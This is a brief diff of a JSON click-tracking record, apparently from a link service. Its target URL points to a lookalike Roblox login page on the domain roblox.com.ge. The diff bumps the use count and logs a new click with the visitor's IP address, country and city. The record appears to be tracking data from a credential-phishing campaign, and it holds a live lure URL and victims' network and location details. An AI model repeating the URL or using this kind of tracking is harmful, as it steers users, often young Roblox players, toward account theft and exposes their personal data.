@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 838,
+    "useCount": 839,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6816,6 +6816,14 @@
         "city": "Iloilo City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777175304013,
+        "ip": "104.219.26.102",
+        "country": "Saint Vincent and the Grenadines",
+        "city": "Kingstown",
+        "flag": "🇻🇨",
+        "countryCode": "VC"
       }
     ]
   },
